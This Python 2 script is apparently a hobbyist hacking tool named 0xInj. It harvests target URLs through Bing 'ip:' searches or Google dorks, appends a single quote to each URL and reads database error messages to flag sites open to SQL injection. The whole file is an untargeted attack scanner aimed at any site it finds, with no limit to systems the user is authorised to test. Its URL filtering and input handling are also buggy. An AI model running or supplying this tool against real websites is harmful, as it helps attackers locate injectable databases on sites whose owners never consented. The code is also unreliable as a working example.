#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 0xInj v2.1
# Coded By: Abdullah AlZahrani

try:
    from googlesearch.googlesearch import GoogleSearch
except:
    print "[!] You need to install (GoogleSearch)\n[#] You Can install it by typing: pip install google-search"
import urllib
try:
    import requests
except:
    print "[!] You need to install (requests)\n[#] You Can install it by typing: pip install requests"
import lxml.html
import socket



print ''' \033[1;36m
        ╭━━━┳━╮╭━╮╭━╮╱╭╮╭━━━╮╱╱╱╱╱╭╮
        ┃╭━╮┣╮╰╯╭╯┃┃╰╮┃┣┫╭━━╯╱╱╱╱╱┃┃
        ┃┃┃┃┃╰╮╭╯╭┫╭╮╰╯┣┫╰━━┳┳━╮╭━╯┣━━┳━╮
        ┃┃┃┃┃╭╯╰╮┣┫┃╰╮┃┣┫╭━━╋┫╭╮┫╭╮┃┃━┫╭╯
        ┃╰━╯┣╯╭╮╰┫┃┃╱┃┃┃┃┃╱╱┃┃┃┃┃╰╯┃┃━┫┃
        ╰━━━┻━╯╰━┻┻╯╱╰━┫┣╯╱╱╰┻╯╰┻━━┻━━┻╯
        ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╯┃ 0xiNjFinder v2.1
        ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━╯ Coded By: Abdullah AlZahrani
        Twitter: @0xAbdullah | WebSite: WWW.0XA.TECH
\033[1;m\n'''

List = '''
 |1| > Find SQL Injection On Server
 |2| > Find SQL Injection On Google [By Droks]
\n'''
print List

def Server():
    try:
        ip = raw_input('[-] Enter IP or Domain: ')
        while not ip:
            print "[Error! ]"
            ip = raw_input('[-] Enter IP or Domain: ')
        if ip.startswith("http://") or ip.startswith("https://"):
            ip = ip.replace("http://","") or ip.replace("https://","")
        ip = socket.gethostbyname(ip)
    except:
        pass
    headers = { 'User-Agent' : 'Mozilla/5.0' }
    connection = urllib.urlopen("https://www.bing.com/search?q=ip:"+ip+" php?id=", None, headers)
    dom =  lxml.html.fromstring(connection.read())
    print ("IP: %s" % (ip))
    for url in dom.xpath('//a/@href'):
        BlackList = "https://go.microsoft", "http://go.microsoft", "http://www.microsofttranslator.com"
        if url.startswith(BlackList):
            pass
        elif not url.startswith('http://') or url.startswith('https://') or url.startswith('www.'):
            pass
        elif not "=" in url:
            pass
        else:
            Checker(url)
    print ("\n[#] Done !")
def Google():
    dork = raw_input(' > Enter Dork | ex: inurl:".php?id=":\n > ')
    Results = input(" > How many results do you want?\n > ")
    response = GoogleSearch().search(dork, Results)
    for result in response.results:
        url = result.url
        Checker(url)

    print ("\n[#] Done !")

def Checker(url):
    check = "'"
    print ("\nTesting %s" % (url))
    checker = requests.post(url+check)
    if "MySQL" in checker.text:
        print "\033[1;42m[*] SQL iNjection Found > Database type: MySQL \033[1;m"
    elif "native client" in checker.text:
        print "\033[1;42m[*] SQL iNjection Found > Database type: MSSQL \033[1;m"
    elif "syntax error" in checker.text:
        print "\033[1;42m[*] SQL iNjection Found > Database type: PostGRES \033[1;m"
    elif "ORA" in checker.text:
        print "\033[1;42m[*] SQL iNjection Found > Database type: Oracle \033[1;m"
    elif "MariaDB" in checker.text:
        print "\033[1;42m[*] SQL iNjection Found > Database type: MariaDB \033[1;m"
    elif "You have an error in your SQL syntax;" in checker.text:
        print "\033[1;42m[*] SQL iNjection Found > Database type: None ! \033[1;m"
    else:
        print "\033[1;41m[!] Oops SQL iNjection Not Found ! \033[1;m"
List = raw_input(" > ")
if List == "1":
    Server()
elif List == "2":
    Google()
else:
    while not List:
        print "[!] Error! Invalid input"
        List = raw_input(" > ")
